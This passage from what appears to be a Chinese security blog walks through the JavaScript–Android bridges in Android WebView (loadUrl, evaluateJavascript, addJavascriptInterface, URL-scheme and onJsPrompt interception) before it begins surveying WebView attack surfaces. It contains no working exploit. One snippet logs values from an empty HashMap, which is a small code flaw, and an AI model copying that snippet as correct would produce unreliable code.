注意调用的JS方法名要对应上</span></span><br><span class=\"line\">                 <span class=\"comment\">// 调用javascript的callJS()方法</span></span><br><span class=\"line\">                 mWebView.loadUrl(<span class=\"string\">&quot;javascript:callJS()&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class=\"line\"> <span class=\"comment\">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class=\"line\"> <span class=\"comment\">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class=\"line\"> <span class=\"comment\">//设置响应js 的Alert()函数</span></span><br><span class=\"line\"> mWebView.setWebChromeClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebChromeClient</span>() &#123;</span><br><span class=\"line\">     <span class=\"meta\">@Override</span></span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onJsAlert</span><span class=\"params\">(WebView view, String url, String message, <span class=\"keyword\">final</span> JsResult result)</span> &#123;</span><br><span class=\"line\">         AlertDialog.<span class=\"type\">Builder</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AlertDialog</span>.Builder(MainActivity.<span class=\"built_in\">this</span>);</span><br><span class=\"line\">         b.setTitle(<span class=\"string\">&quot;Alert&quot;</span>);</span><br><span class=\"line\">         b.setMessage(message);</span><br><span class=\"line\">         b.setPositiveButton(android.R.string.ok, <span class=\"keyword\">new</span> <span class=\"title class_\">DialogInterface</span>.OnClickListener() &#123;</span><br><span class=\"line\">             <span class=\"meta\">@Override</span></span><br><span class=\"line\">             <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onClick</span><span class=\"params\">(DialogInterface dialog, <span class=\"type\">int</span> which)</span> &#123;</span><br><span class=\"line\">                 result.confirm();</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;);</span><br><span class=\"line\">         b.setCancelable(<span class=\"literal\">false</span>);</span><br><span class=\"line\">         b.create().show();</span><br><span class=\"line\">         <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> &#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>效果演示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/9.png\" alt=\"image-20220729093932401\"></p>\n<p>我们可以发现程序成功的加载了html文件，然后我们点击按钮去调用js中的方法</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/10.png\" alt=\"image-20220729094015144\"></p>\n<p>这里就成功的通过loadUrl进行了调用</p>\n<p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</span><br></pre></td></tr></table></figure>\n\n<p><strong>WebView.evaluateJavascript()</strong></p>\n<p>优点：该方法比第一种方法效率更高、使用更简洁</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">因为该方法的执行不会使页面刷新，而第一种方法（loadUrl ）的执行则会。</span><br><span class=\"line\">Android <span class=\"number\">4.4</span> 后才可使用</span><br></pre></td></tr></table></figure>\n\n<p>具体使用：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//使用evaluateJavascript来加载</span></span><br><span class=\"line\">mWebView.evaluateJavascript(<span class=\"string\">&quot;javascript:callJS()&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceiveValue</span><span class=\"params\">(String value)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//此处为 js 返回的结果</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/11.png\" alt=\"image-20220729094734817\"></p>\n<p>同样加载成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/12.png\" alt=\"image-20220729094802205\"></p>\n<h5 id=\"lt-2-gt-JS调用Android\"><a href=\"#lt-2-gt-JS调用Android\" class=\"headerlink\" title=\"&lt;2&gt;JS调用Android\"></a>&lt;2&gt;JS调用Android</h5><p><strong><code>addJavascriptInterface</code></strong></p>\n<p>首先，准备html文件，放到assets中</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//JS调用Android</span></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Carson<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">         <span class=\"keyword\">function</span> <span class=\"title function_\">callAndroid</span>(<span class=\"params\"></span>)&#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"comment\">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            test.<span class=\"title function_\">hello</span>(<span class=\"string\">&quot;WindXaa js调用了android中的hello方法&quot;</span>);</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">         &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">      </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"comment\">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;button1&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;callAndroid()&quot;</span>&gt;</span>Click Attack<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/13.png\" alt=\"image-20220729100734122\"></p>\n<p>然后加载调用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JsToAndroActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_js_to_andro);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">WebView</span> <span class=\"variable\">mWebView</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class=\"line\">        <span class=\"type\">WebSettings</span> <span class=\"variable\">webSettings</span> <span class=\"operator\">=</span> mWebView.getSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 设置与Js交互的权限</span></span><br><span class=\"line\">        webSettings.setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class=\"line\">        <span class=\"comment\">//参数1：Javascript对象名</span></span><br><span class=\"line\">        <span class=\"comment\">//参数2：Java对象名</span></span><br><span class=\"line\">        mWebView.addJavascriptInterface(<span class=\"keyword\">new</span> <span class=\"title class_\">AndroidtoJs</span>(), <span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 加载JS代码</span></span><br><span class=\"line\">        <span class=\"comment\">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class=\"line\">        mWebView.loadUrl(<span class=\"string\">&quot;file:///android_asset/javascript.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 提供接口在Webview中供JS调用</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AndroidtoJs</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class=\"line\">        <span class=\"meta\">@JavascriptInterface</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">hello</span><span class=\"params\">(String msg)</span> &#123;</span><br><span class=\"line\">            Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>,<span class=\"string\">&quot;Hello，&quot;</span> + msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们切换到第二个测试用例</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/14.png\" alt=\"image-20220729100854323\"></p>\n<p>直接点击</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/15.png\" alt=\"image-20220729100914639\"></p>\n<p>此时已经成功的加载了我们的JS，我们点击按钮</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/16.png\" alt=\"image-20220729101013208\"></p>\n<p>js中就成功的加载了Android中的hello方法</p>\n<p><strong><code>WebViewClient.shouldOverrideUrlLoading ()</code></strong></p>\n<p>具体原理：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url</span><br><span class=\"line\">(<span class=\"number\">2</span>)解析该 url 的协议</span><br><span class=\"line\">(<span class=\"number\">3</span>)如果检测到是预先约定好的协议，就调用相应方法</span><br></pre></td></tr></table></figure>\n\n<p>即JS需要调用Android的方法</p>\n<p>具体使用：</p>\n<p>首先，在JS中约定所需要的Url协议，以.html格式放到src&#x2F;main&#x2F;assets文件夹里</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;Carson_Ho&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;script&gt;</span><br><span class=\"line\">         function <span class=\"title function_\">callAndroid</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">/*约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack*/</span></span><br><span class=\"line\">            document.location = <span class=\"string\">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">      &lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 点击按钮则调用callAndroid（）方法  --&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;button type=<span class=\"string\">&quot;button&quot;</span> id=<span class=\"string\">&quot;button1&quot;</span> onclick=<span class=\"string\">&quot;callAndroid()&quot;</span>&gt;点击调用Android代码&lt;/button&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后我们新建一个类，并编写代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">     <span class=\"type\">WebView</span> <span class=\"variable\">mWebView</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.Wind_webview2);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">WebSettings</span> <span class=\"variable\">webSettings</span> <span class=\"operator\">=</span> mWebView.getSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 设置与Js交互的权限</span></span><br><span class=\"line\">        webSettings.setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 设置允许JS弹窗</span></span><br><span class=\"line\">        webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 步骤1：加载JS代码</span></span><br><span class=\"line\">        <span class=\"comment\">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class=\"line\">        mWebView.loadUrl(<span class=\"string\">&quot;file:///android_asset/javascript1.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 复写WebViewClient类的shouldOverrideUrlLoading方法</span></span><br><span class=\"line\">        mWebView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>() &#123;</span><br><span class=\"line\">                                      <span class=\"meta\">@Override</span></span><br><span class=\"line\">                                      <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">shouldOverrideUrlLoading</span><span class=\"params\">(WebView view, String url)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                                          <span class=\"comment\">// 步骤2：根据协议的参数，判断是否是所需要的url</span></span><br><span class=\"line\">                                          <span class=\"comment\">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class=\"line\">                                          <span class=\"comment\">//约定的url协议为：js://webview?arg1=WindXaa&amp;arg2=attack（同时也是约定好的需要拦截的）</span></span><br><span class=\"line\"></span><br><span class=\"line\">                                          <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(url);</span><br><span class=\"line\">                                          <span class=\"comment\">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class=\"line\">                                          <span class=\"comment\">// 就解析往下解析参数</span></span><br><span class=\"line\">                                          <span class=\"keyword\">if</span> ( uri.getScheme().equals(<span class=\"string\">&quot;js&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                                              <span class=\"comment\">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class=\"line\">                                              <span class=\"comment\">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class=\"line\">                                              <span class=\"keyword\">if</span> (uri.getAuthority().equals(<span class=\"string\">&quot;webview&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                                                  <span class=\"comment\">//  步骤3：</span></span><br><span class=\"line\">                                                  <span class=\"comment\">// 执行JS所需要调用的逻辑</span></span><br><span class=\"line\">                                                  System.out.println(<span class=\"string\">&quot;js调用了Android的方法&quot;</span>);</span><br><span class=\"line\">                                                  <span class=\"comment\">// 可以在协议上带有参数并传递到Android上</span></span><br><span class=\"line\">                                                  HashMap&lt;String, String&gt; params = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">                                                  Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class=\"line\">                                                  Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>,params.get(<span class=\"number\">0</span>)+<span class=\"string\">&quot;---&quot;</span>+params.get(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                                              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                              <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">                                          &#125;</span><br><span class=\"line\">                                          <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class=\"line\">                                      &#125;</span><br><span class=\"line\">                                  &#125;</span><br><span class=\"line\">        );</span><br></pre></td></tr></table></figure>\n\n<p>运行程序：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/17.png\" alt=\"image-20220729105941115\"></p>\n<p>这里就调用Android代码成功</p>\n<p> <strong><code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code></strong></p>\n<p>在JS中，上面三种方法分别回调l拦截对话框<code>alert()</code>、<code>confirm()</code>、<code>prompt()</code>的信息：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/18.png\" alt=\"image-20220729110247468\"></p>\n<p>Android通过 <code>WebChromeClient</code> 的<code>onJsAlert()</code>、<code>onJsConfirm()</code>、<code>onJsPrompt（）</code>方法回调分别拦截JS对话框（即上述三个方法），得到他们的消息内容，然后解析即可</p>\n<p>然后我们再次编写js代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Carson_Ho<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">\t<span class=\"keyword\">function</span> <span class=\"title function_\">clickprompt</span>(<span class=\"params\"></span>)&#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">    <span class=\"comment\">// 调用prompt（）</span></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">    <span class=\"keyword\">var</span> result=<span class=\"title function_\">prompt</span>(<span class=\"string\">&quot;js://webview?arg1=WindXaa&amp;arg2=attack&quot;</span>);</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">    <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;demo &quot;</span> + result);</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">&#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">      </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"comment\">&lt;!-- 点击按钮则调用clickprompt()  --&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;button1&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;clickprompt()&quot;</span>&gt;</span>点击调用Android代码<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>我们编写onJsPrompt 回调方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">WebView</span> <span class=\"variable\">mWebView</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.Wind_webview3);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">WebSettings</span> <span class=\"variable\">webSettings</span> <span class=\"operator\">=</span> mWebView.getSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// 设置与Js交互的权限</span></span><br><span class=\"line\">      webSettings.setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\">      <span class=\"comment\">// 设置允许JS弹窗</span></span><br><span class=\"line\">      webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// 先加载JS代码</span></span><br><span class=\"line\">      <span class=\"comment\">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class=\"line\">      mWebView.loadUrl(<span class=\"string\">&quot;file:///android_asset/javascript2.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      mWebView.setWebChromeClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebChromeClient</span>() &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 拦截输入框(原理同方式2)</span></span><br><span class=\"line\">          <span class=\"comment\">// 参数message:代表promt（）的内容（不是url）</span></span><br><span class=\"line\">          <span class=\"comment\">// 参数result:代表输入框的返回值</span></span><br><span class=\"line\">          <span class=\"meta\">@Override</span></span><br><span class=\"line\">          <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onJsPrompt</span><span class=\"params\">(WebView view, String url, String message, String defaultValue, JsPromptResult result)</span> &#123;</span><br><span class=\"line\">              <span class=\"comment\">// 根据协议的参数，判断是否是所需要的url(原理同方式2)</span></span><br><span class=\"line\">              <span class=\"comment\">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(message);</span><br><span class=\"line\">              <span class=\"comment\">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class=\"line\">              <span class=\"comment\">// 就解析往下解析参数</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (uri.getScheme().equals(<span class=\"string\">&quot;js&quot;</span>)) &#123;</span><br><span class=\"line\">                  <span class=\"comment\">//js://webview?arg1=WindXaa&amp;arg2=attack</span></span><br><span class=\"line\">                  <span class=\"comment\">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class=\"line\">                  <span class=\"comment\">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class=\"line\">                  <span class=\"keyword\">if</span> (uri.getAuthority().equals(<span class=\"string\">&quot;webview&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                      <span class=\"comment\">// 执行JS所需要调用的逻辑</span></span><br><span class=\"line\">                      System.out.println(<span class=\"string\">&quot;js调用了Android的方法&quot;</span>);</span><br><span class=\"line\">                      <span class=\"comment\">// 可以在协议上带有参数并传递到Android上</span></span><br><span class=\"line\">                      HashMap&lt;String, String&gt; params = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">                      Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class=\"line\"></span><br><span class=\"line\">                      <span class=\"comment\">//参数result:代表消息框的返回值(输入值)</span></span><br><span class=\"line\">                      result.confirm(<span class=\"string\">&quot;js调用了Android的方法成功啦&quot;</span>);</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.onJsPrompt(view, url, message, defaultValue, result);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>运行程序：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/19.png\" alt=\"image-20220729143728889\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/20.png\" alt=\"image-20220729143746516\"></p>\n<p>我们可以发现这里已经成功的加载了html，然后我们再次点击按钮可以发现通过回调成功的调用了函数，并且显示了弹窗</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/21.png\" alt=\"image-20220729143927623\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/22.png\" alt=\"image-20220729144012571\"></p>\n<p>其余两种方法同理：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 拦截JS的警告框</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onJsAlert</span><span class=\"params\">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.onJsAlert(view, url, message, result);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 拦截JS的确认框</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onJsConfirm</span><span class=\"params\">(WebView view, String url, String message, JsResult result)</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.onJsConfirm(view, url, message, result);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、WebView的漏洞面\"><a href=\"#三、WebView的漏洞面\" class=\"headerlink\" title=\"三、WebView的漏洞面\"></a>三、WebView的漏洞面</h2><p>WebView 漏洞在Android APP中占比十分巨大，根据梆梆安全的《2021年移动安全形势分析与2022年研判》中显示，WebView漏洞总和仍然占据目前Android APP漏洞类别前列，如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/23.png\" alt=\"image-20220729145936266\"></p>\n<p>因此了解和掌握WebView漏洞的原理和技巧是十分重要的</p>\n<h3 id=\"1-WebView的漏洞面\"><a href=\"#1-WebView的漏洞面\" class=\"headerlink\" title=\"1.WebView的漏洞面\"></a>1.WebView的漏洞面</h3><p>谈起WebView漏洞，我们的目光回退到2020年看雪SDC沙龙会议中，来自OPPO实验室的何恩大佬发表的《Android WebView安全攻防指南2020》的演讲，大佬从WebView的<code>本地攻击面、远程攻击面、特殊攻击面</code>共3个角度讲述了WebView漏洞的成因，原文链接：<a href=\"https://zhuanlan.kanxue.com/article-14155.htm\">Android WebView安全攻防指南2020</a>，这里引用大佬的WebView示例图，如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/24.png\" alt=\"image-20220729150558039\"></p>\n<p>从图中我们可以看出WebView的漏洞攻击面，从引导组件Intent、deeplink，包括了WebView自身的接口，以及一些端口协议等等攻击面</p>\n<h3 id=\"2-WebView漏洞发展总结\"><a href=\"#2-WebView漏洞发展总结\" class=\"headerlink\" title=\"2.WebView漏洞发展总结\"></a>2.WebView漏洞发展总结</h3><p>考虑到WebView漏洞的攻击面十分的杂乱，这里我对WebView漏洞的发展进行了一个梳理总结，如下所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/25.png\" 